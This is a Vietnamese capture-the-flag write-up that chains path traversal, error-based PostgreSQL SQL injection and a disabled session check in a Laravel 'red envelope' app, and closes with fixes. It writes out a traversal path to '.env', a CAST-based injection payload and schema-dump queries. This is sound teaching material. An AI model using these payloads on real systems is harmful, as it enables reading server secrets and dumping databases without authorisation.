---
title: "Lucky Money CTF Write-up"
date: "2024-03-20"
status: "SECURITY"
summary: "Khai thác lỗ hổng Path Traversal, SQL Injection và Broken Business Logic trong hệ thống Lucky Money viết bằng Laravel + PostgreSQL."
tags: ["web-security", "ctf", "laravel", "sqli", "path-traversal"]
---

## 1. Overview

Ứng dụng web là một hệ thống **Lucky Money / Red Envelope** viết bằng **Laravel + PostgreSQL**. Người chơi mở các bao lì xì để tích điểm, sau đó có thể đổi điểm lấy phần thưởng.

Phần thưởng cuối cùng được lấy từ **database `exchange`**, bảng `flag`.

Mục tiêu của challenge là lấy giá trị `flag`.

---

# 2. Recon

Trang web có các endpoint chính:

```
/login
/envelopes
/envelopes/view
/envelopes/{id}/open
/themes/select
/lucky/exchange
```

Sau khi login, người chơi có thể mở bao lì xì để nhận tiền.

Bảng leaderboard hiển thị:

```
User: money
Total: 3,000,000
Opens: 3
```

---

# 3. Path Traversal

Endpoint:

```
GET /envelopes/view?path=...
```

cho phép đọc file từ server.

Ví dụ:

```
/envelopes/view?path=../../.env
```

File `.env` bị lộ:

```
DB_CONNECTION=pgsql
DB_DATABASE=treasure
DB_USERNAME=admin
DB_PASSWORD=secret
```

Từ đây xác nhận:

* Database: **PostgreSQL**
* Laravel application

---

# 4. SQL Injection

Endpoint:

```
POST /themes/select
```

bị **SQL Injection**.

Query backend dạng:

```sql
select * from themes where id = <input> limit 1
```

Payload:

```sql
1 AND 1=CAST((SELECT version()) AS INT)--
```

Error message trả về:

```
invalid input syntax for type integer:
"PostgreSQL 15..."
```

→ **Error-based SQL Injection** được xác nhận.

---

# 5. Database Enumeration

Dump schema:

```sql
SELECT table_name,column_name
FROM information_schema.columns
```

Các bảng quan trọng:

```
red_envelopes
envelope_opens
lucky_money
users
```

---

# 6. Dump Envelope Data

Dump các envelope còn available:

```sql
SELECT id,price
FROM red_envelopes
WHERE status='available'
ORDER BY price DESC
```

Kết quả:

```
UUID : 1000000
UUID : 1000000
UUID : 1000000
...
```

Có 10 envelope, mỗi cái giá **1,000,000**.

---

# 7. Source Code Disclosure

Nhờ path traversal, đọc được controller:

```
app/Http/Controllers/LuckyController.php
```

Code quan trọng:

```php
$totalAmount = EnvelopeOpen::query()
    ->where('user_id', $user->id)
    ->sum('amount');

if ($totalAmount < 2500000) {
    return error;
}

$flagName = DB::connection('exchange')
    ->table('flag')
    ->where('id', 1)
    ->value('name');
```

Điều kiện đổi quà:

```
SUM(amount) >= 2,500,000
```

Flag nằm ở:

```
DB: exchange
table: flag
column: name
row: id=1
```

---

# 8. Broken Business Logic

Trong `EnvelopeController::open()`:

```php
// $allowedIds = $request->session()->get('random_envelopes', []);
// if (! in_array($envelope->id, $allowedIds, true)) { ... }
```

Đoạn kiểm tra đã bị **comment out**.

Kết quả:

* người chơi có thể mở **bất kỳ envelope nào**
* chỉ cần biết UUID

---

# 9. Envelope Opening Logic

Endpoint:

```
POST /envelopes/{uuid}/open
```

Giới hạn:

```
max_opens_per_user = 3
```

Nhưng mỗi envelope có:

```
price = 1,000,000
```

Chỉ cần mở:

```
3 envelopes
```

→ tổng tiền:

```
3,000,000
```

≥ `2,500,000`

---

# 10. Redeeming Reward

Sau khi đạt đủ tiền:

```
POST /lucky/exchange
```

Controller sẽ đọc:

```sql
SELECT name FROM flag WHERE id=1
```

---

# 11. Bug in Response Handling

Response code:

```php
return back()->status(200)->with('status',$status);
```

Laravel redirect không hỗ trợ chain này.

Result:

```
Call to a member function with() on int
```

→ server ném **Internal Server Error**.

Tuy nhiên query lấy flag đã chạy trước đó.

---

# 12. Vulnerability Chain

Chuỗi khai thác hoàn chỉnh:

1️⃣ Path Traversal → đọc source code
2️⃣ SQL Injection → enumerate database
3️⃣ Source disclosure → xác định location của flag
4️⃣ Broken business logic → mở envelope tùy ý
5️⃣ Accumulate ≥ 2.5M points
6️⃣ Call `/lucky/exchange` → trigger flag query

---

# 13. Root Causes

### 1. Path Traversal

User controlled file path không được sanitize.

---

### 2. SQL Injection

Query raw concatenation:

```
where id = $input
```

---

### 3. Broken Business Logic

Session validation bị comment:

```
random_envelopes check removed
```

---

### 4. Improper Response Handling

Invalid method chain:

```
back()->status(200)->with(...)
```

---

# 14. Security Impact

Attacker có thể:

* đọc file server
* dump database
* bypass envelope opening restrictions
* truy cập **flag database**

---

# 15. Suggested Fixes

### Path Traversal

Normalize path:

```
realpath()
```

---

### SQL Injection

Sử dụng prepared statements / query builder.

---

### Business Logic

Khôi phục validation:

```php
if (! in_array($envelope->id, $allowedIds))
```

---

### Response Handling

Sửa:

```php
return back()->with('status',$status);
```

---

# 16. Conclusion

Challenge cho thấy cách kết hợp nhiều lỗi nhỏ:

* file read
* SQL injection
* business logic flaw

để cuối cùng truy cập được **secret data trong database thứ hai (`exchange`)**.
